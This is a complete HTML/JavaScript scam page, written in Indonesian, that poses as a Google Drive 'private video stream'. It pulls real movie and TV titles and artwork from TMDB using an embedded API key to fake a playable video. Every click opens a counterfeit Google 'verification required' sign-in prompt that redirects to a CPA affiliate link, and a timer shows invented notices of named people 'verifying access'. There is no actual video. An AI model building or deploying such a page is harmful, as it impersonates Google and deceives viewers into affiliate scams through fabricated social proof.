<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    
    <title>Private Cloud Storage - Streaming Access</title>

    <meta property="og:site_name" content="FILE-TV.RF.GD">
    <meta property="og:title" id="og-title" content="[DIRECT ACCESS] Private Video Stream">
    <meta property="og:description" id="og-description" content="Identity verification required. Encrypted 1080p streaming enabled.">
    <meta property="og:image" id="og-image" content="https://www.gstatic.com/images/branding/product/2x/drive_2020q4_96dp.png">
    <meta property="og:type" content="video.other">
    <meta name="twitter:card" content="summary_large_image">

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">

    <style>
        :root { 
            --drive-bg: #000;
            --header-bg: rgba(31, 31, 31, 0.98);
            --accent: #8ab4f8;
            --border: rgba(255, 255, 255, 0.1);
            --item-hover: rgba(255, 255, 255, 0.05);
        }

        body { 
            background: var(--drive-bg); color: #e8eaed; font-family: 'Roboto', sans-serif; 
            margin: 0; padding: 0; overflow-x: hidden; -webkit-tap-highlight-color: transparent;
        }

        /* HEADER */
        .g-header {
            position: fixed; top: 0; width: 100%; height: 60px;
            background: var(--header-bg); display: flex; align-items: center;
            justify-content: space-between; padding: 0 16px; z-index: 1000;
            backdrop-filter: blur(10px); border-bottom: 1px solid var(--border);
            box-sizing: border-box;
        }
        .h-left { display: flex; align-items: center; gap: 12px; flex: 1; min-width: 0; }
        .file-icon { color: #ea4335; font-size: 20px; flex-shrink: 0; }
        .file-title { font-size: 15px; font-weight: 400; color: #fff; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }

        /* PLAYER AREA */
        .stage {
            width: 100%; min-height: 40vh; max-height: 80vh; 
            display: flex; align-items: center; justify-content: center;
            background: #000; margin-top: 60px; padding: 10px; box-sizing: border-box;
        }
        .video-wrapper {
            width: 100%; max-width: 1000px; aspect-ratio: 16/9;
            background-color: #111;
            background-size: cover; background-position: center;
            position: relative; overflow: hidden; border-radius: 4px; cursor: pointer;
        }
        .video-wrapper::before {
            content: ''; position: absolute; inset: 0; background: rgba(0,0,0,0.4);
        }
        .play-btn {
            width: 65px; height: 65px; background: rgba(0,0,0,0.5);
            border: 2px solid #fff; border-radius: 50%;
            display: flex; align-items: center; justify-content: center; z-index: 5;
        }
        .play-btn i { font-size: 24px; color: #fff; margin-left: 4px; }
        
        /* DROPDOWN & LIST */
        .main-content { max-width: 1000px; margin: 0 auto; padding: 20px; }
        .section-bar { display: flex; align-items: center; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid var(--border); margin-bottom: 10px; }
        .section-label { font-size: 12px; font-weight: 500; color: #9aa0a6; text-transform: uppercase; }

        .file-item { 
            display: flex; align-items: center; padding: 12px 10px; 
            border-bottom: 1px solid rgba(255,255,255,0.03);
            text-decoration: none; color: #e8eaed; transition: 0.2s;
        }
        .file-item:hover { background: var(--item-hover); }
        .file-item.active { background: rgba(138, 180, 248, 0.1); color: var(--accent); }
        .file-info-name { font-size: 14px; flex: 1; }

        /* MODAL */
        .modal-overlay {
            position: fixed; inset: 0; background: rgba(0,0,0,0.8);
            display: none; align-items: center; justify-content: center;
            z-index: 9999; backdrop-filter: blur(8px);
        }
        .modal-box {
            background: #202124; width: 85%; max-width: 320px; padding: 30px; 
            border-radius: 12px; text-align: center; border: 1px solid var(--border);
        }
        .btn-reg { background: var(--accent); color: #000; border: none; padding: 12px; border-radius: 6px; font-weight: 700; width: 100%; margin-top: 20px; cursor: pointer; }

        /* NOTIF */
        #fake-notif { 
            position: fixed; bottom: 20px; left: -400px; 
            background: #1f1f1f; border: 1px solid var(--border); 
            padding: 12px; border-radius: 8px; display: flex; align-items: center; 
            gap: 10px; z-index: 9999; transition: 0.5s; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        #fake-notif.show { left: 20px; }
    </style>
</head>
<body>

<div id="fake-notif">
    <div style="color:var(--accent)"><i class="fas fa-check-circle"></i></div>
    <div id="notif-text" style="font-size:11px;"></div>
</div>

<nav class="g-header">
    <div class="h-left">
        <i class="fas fa-arrow-left"></i>
        <i class="fas fa-file-video file-icon"></i>
        <div class="file-title" id="display-filename">Loading...</div>
    </div>
    <div class="h-right">
        <i class="fas fa-download" onclick="showPopup()"></i>
        <i class="fas fa-user-circle" onclick="showPopup()"></i>
    </div>
</nav>

<div class="stage">
    <div class="video-wrapper" id="player-bg" onclick="triggerPlay()">
        <div style="position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; z-index: 10;">
            <div class="play-btn"><i class="fas fa-play"></i></div>
        </div>
        <div style="position: absolute; bottom: 0; width: 100%; padding: 15px; background: linear-gradient(transparent, black); box-sizing: border-box;">
            <div style="width:100%; height:3px; background:rgba(255,255,255,0.2); margin-bottom:10px;"></div>
            <div style="display:flex; justify-content:space-between; font-size:12px;">
                <span id="display-runtime">0:00 / 00:00</span>
                <i class="fas fa-expand"></i>
            </div>
        </div>
    </div>
</div>

<main class="main-content">
    <div id="tv-controls" style="display:none;">
        <div class="section-bar">
            <span class="section-label">Episodes</span>
            <select id="season-select" onchange="changeSeason(this.value)" style="background:#111; color:var(--accent); border:1px solid var(--border); border-radius:4px; padding:4px;"></select>
        </div>
        <div id="episode-list"></div>
    </div>
</main>

<div class="modal-overlay" id="regModal">
    <div class="modal-box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="80" style="margin-bottom:15px">
        <h2 style="font-size:18px; margin:0;">Verifikasi Diperlukan</h2>
        <p style="font-size:13px; color:#9aa0a6;">Silakan masuk ke akun Google Drive Anda untuk melanjutkan streaming dalam kualitas 1080p.</p>
        <button class="btn-reg" onclick="handleCPA()">SIGN IN TO ACCESS</button>
        <p style="font-size:11px; margin-top:15px; color:#5f6368;" onclick="closePopup()">Batal</p>
    </div>
</div>

<script>
    const API_KEY = "22be462e6d3de1dbab03d1ca50847b5a";
    const CPA_LINK = "https://playfloowz.com/c?a=275&o=19&sub2=tv";

    const params = new URLSearchParams(window.location.search);
    const type = params.get('type') || 'movie';
    const id = params.get('id');
    const s = params.get('s') || 1;
    const e = params.get('e') || 1;

    async function init() {
        if(!id) return;
        
        try {
            // Fetch Detail
            const res = await fetch(`https://api.themoviedb.org/3/${type}/${id}?api_key=${API_KEY}`);
            const data = await res.json();
            const name = data.title || data.name;

            let backdrop = `https://image.tmdb.org/t/p/w1280${data.backdrop_path}`;
            let fileName = name;
            let runtime = data.runtime || 120;

            if(type === 'tv') {
                document.getElementById('tv-controls').style.display = 'block';
                const epRes = await fetch(`https://api.themoviedb.org/3/tv/${id}/season/${s}/episode/${e}?api_key=${API_KEY}`);
                const epData = await epRes.json();
                
                if(epData.still_path) backdrop = `https://image.tmdb.org/t/p/w1280${epData.still_path}`;
                fileName = `${name} S${s.padStart(2,'0')} E${e.padStart(2,'0')}`;
                runtime = epData.runtime || 45;

                loadSeasons(data.number_of_seasons);
                loadEpisodes(id, s);
            }

            // Update UI
            document.title = `${fileName}.mp4 - CloudStream`;
            document.getElementById('display-filename').innerText = `${fileName}.mp4`;
            document.getElementById('player-bg').style.backgroundImage = `url(${backdrop})`;
            document.getElementById('display-runtime').innerText = `0:00 / ${runtime}:00`;

            // Update Meta (Hanya untuk UI Browser, tidak untuk pratinjau chat)
            document.getElementById('og-image').setAttribute('content', backdrop);
            document.getElementById('og-title').setAttribute('content', `[HD] ${fileName}`);

        } catch (err) { console.error(err); }
    }

    async function loadSeasons(total) {
        const select = document.getElementById('season-select');
        for(let i=1; i<=total; i++) {
            const opt = document.createElement('option');
            opt.value = i; opt.text = `Season ${i}`;
            if(i == s) opt.selected = true;
            select.appendChild(opt);
        }
    }

    async function loadEpisodes(tvId, seasonNum) {
        const res = await fetch(`https://api.themoviedb.org/3/tv/${tvId}/season/${seasonNum}?api_key=${API_KEY}`);
        const data = await res.json();
        const list = document.getElementById('episode-list');
        
        list.innerHTML = data.episodes.map(ep => `
            <a href="?type=tv&id=${tvId}&s=${seasonNum}&e=${ep.episode_number}" class="file-item ${ep.episode_number == e ? 'active' : ''}">
                <i class="fas fa-play-circle" style="margin-right:10px; opacity:0.5"></i>
                <div class="file-info-name">Episode ${ep.episode_number} - ${ep.name}</div>
                <div style="font-size:10px; opacity:0.5">${ep.runtime || 45}m</div>
            </a>
        `).join('');
    }

    function changeSeason(newS) { window.location.href = `?type=tv&id=${id}&s=${newS}&e=1`; }
    function triggerPlay() { showPopup(); }
    function showPopup() { document.getElementById('regModal').style.display = 'flex'; }
    function closePopup() { document.getElementById('regModal').style.display = 'none'; }
    function handleCPA() { window.location.href = CPA_LINK; }

    // Fake Notif
    setInterval(() => {
        const names = ["Andi", "Santi", "Budi", "Rina", "Kevin", "Jessica"];
        const name = names[Math.floor(Math.random()*names.length)];
        const notif = document.getElementById('fake-notif');
        document.getElementById('notif-text').innerHTML = `<b>${name}</b> baru saja memverifikasi akses.<br><span style="color:#4CAF50">Playback Ready (1080p)</span>`;
        notif.classList.add('show');
        setTimeout(() => notif.classList.remove('show'), 5000);
    }, 15000);

    init();
</script>

</body>
</html>
